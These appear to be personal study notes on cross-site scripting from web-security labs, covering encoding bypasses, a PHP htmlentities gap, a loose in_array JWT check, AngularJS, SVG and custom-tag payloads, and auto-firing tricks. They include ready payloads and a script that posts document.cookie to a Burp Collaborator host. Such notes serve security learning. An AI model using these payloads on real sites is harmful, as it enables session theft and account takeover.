exploitation 


- if the payload is inserted in a href    you can use `javascript:payload`
- if you found xss try to find failure to invalidate session on logout
- 

##### encoding and escaping 
###### scenario 1 
in this scenario the single quote is escaped every `'` has `\` that is escaping it and 
trying to escape the back slash didn't work what if we brake the validation on `'` by encoding the characters HTML encoding so we where able of bypassing the validation why ?????
- because that the server didn't decode the user input before it passes to the client browser 
```javascript
<a id="author" href="https://google.com" onclick="var tracker={track(){}};tracker.track('https://google.com');">joe</a>
```
so trying to brake the `'` and try to inject payload in the track function  
by using  `http://goo&apos;-alert(1)-&apos;`
so the returned value from the server will be like that 
```html 
<a id="author" href="[http://goo&apos;-alert(1)-&apos;](http://goo'-alert\(1\)-'/)" onclick="var tracker={track(){}};tracker.track('http://goo&apos;-alert(1)-&apos;');">youssef</a>
```
but stoop here for a sec shouldn't the browser deals with the encoded value as a string (encoded it and use it as a string ) why this payload works then ??/
- the answer is the data is decoded inside a java script function (code) that's why the payload works 


###### scenarion2 
##### htmlentities
```html
<a href='/profile/<?php echo htmlentities($user); ?>'></a>
```
the htmlentities doesn't encode  single quote  so the user may add ' and add event handler 

```php
<?php

// Check if the user has submitted the form

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Get the user input from the form

    $user = $_POST['username'] ;

}

?>

  

<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Profile Page</title>

</head>

<body>

  

<h1>Enter Your Username</h1>

  

<!-- Form to capture the username -->

<form method="POST" action="">

    <label for="username">Username:</label>

    <input type="text" id="username" name="username" required>

    <input type="submit" value="Submit">

</form>

  

<h2>Profile Link</h2>

<!-- Output the username directly in the href link -->

    <a href='/profile/<?php echo htmlentities($user); ?>'>ss</a>

  

</body>

</html>
```

![[Pasted image 20250107194809.png]]
![[Pasted image 20250107194828.png]]

##### in_array
```php
$parts = explode('.', $GET['jwt']);
$algorithms = array('HS256', 'HS384', 'HS512');
if (3 !== count($parts)) {
  throw new \InvalidArgumentException('Invalid or malformed JWT supplied.');
}
$header = jsondecode(self::decode($parts[0]), true);
if (in_array($header['alg'], $algorithms)) {
  ...
}
```
in_array if the attacker sent the algorithm part = 0 then the  check will return valid cuz the comparison is now between INT & string so it will be always true  

**metigate**
in_array(_search, array, type_) the type must be set to <span style="color:rgb(0, 176, 80)">TRUE</span>  to make the search be on type and the content   be === not == 

##### always check the libraries used in the website and search for exploitation in it 
for example for angular JS  if the input field isn't filtered u may use `{{this.constructor.constructor('alert("hack3d")')() }}`

##### Custom Tags

1. **Custom HTML Tags**: Unlike standard HTML tags (e.g., `<script>`, `<h1>`), custom tags are user-defined and typically include a hyphen (e.g., `<custom-tag>`). These tags are not blocked by the WAF in this lab, allowing them to be injected into the DOM.
    
2. **Injecting Custom Tags**: By injecting a custom tag (e.g., `<custom-tag>`), the attacker can add attributes like `onmouseover` or `onfocus` to execute JavaScript when specific events occur.
##### SVG payloads 
```javascript
<svg><animatetransform onbegin=alert(1)>
```
- The `onbegin` event is triggered when an animation begins.
    
- By adding `onbegin=alert(1)` to the `<animatetransform>` element, you're telling the browser to execute the `alert(1)` JavaScript function as soon as the animation starts.


##### Making the Payload Auto-Execute

To make the XSS payload execute automatically without user interaction (e.g., hovering or clicking), the attacker uses the following techniques:

1. **`onfocus` Event**: Instead of `onmouseover`, the attacker uses the `onfocus` event, which triggers when the element gains focus.
    
2. **`id` Attribute**: The custom tag is given an `id` (e.g., `id="x"`) so it can be targeted directly from the URL using a hashtag (e.g., `#x`).
    
3. **`tabindex` Attribute**: To make the custom tag focusable, the attacker adds the `tabindex` attribute (e.g., `tabindex="1"`). This allows the element to be focused automatically when the page loads.
    
4. **URL Crafting**: The final malicious URL includes the `#x` fragment, which causes the browser to focus on the custom tag with `id="x"` as soon as the page loads, triggering the `onfocus` event and executing the JavaScript payload (e.g., `alert(document.cookie)`).




##### Reflected XSS into a Template Literal 
Reflected Cross-Site Scripting (XSS) occurs when user input is directly embedded into a web page without proper sanitization, allowing attackers to inject malicious scripts. When the vulnerable input is included within a **template literal** (JavaScript's backtick-delimited strings with `${}` placeholders), the embedded expressions are evaluated as JavaScript code. If an attacker injects a payload like `${alert(1)}`, the `alert` function (or any other malicious code) will execute because template literals dynamically evaluate expressions. This vulnerability arises when user input is unsafely embedded into template literals, enabling arbitrary JavaScript execution. To prevent this, sanitize user input, avoid embedding untrusted data in template literals, and use output encoding or Content Security Policies (CSP) to mitigate risks.

##### sending the cookies to self host 
```java script
<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
{ method: 'POST', mode: 'no-cors', body:document.cookie }); 
</script>
```
##### notes 
- what if you want to to make the severity of you xss  high and not demand user interaction but only a few tags are allowed like `onresize` so we need auto resize script so if we found that the page allows me to use it in `iframes` so we can use code like that 1. `<iframe src="https://vulnerablePage?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
- even if the element isn't visible in the web site it still be vulnerable to XSS for ex  the website takes the URL and put it in `a` tag in the `head` so it's not visible so we can use that payload `https://victim.com?'accesskey='x'onclick='alert(1)` so when the user press ALT +X the payload will execute  '
-  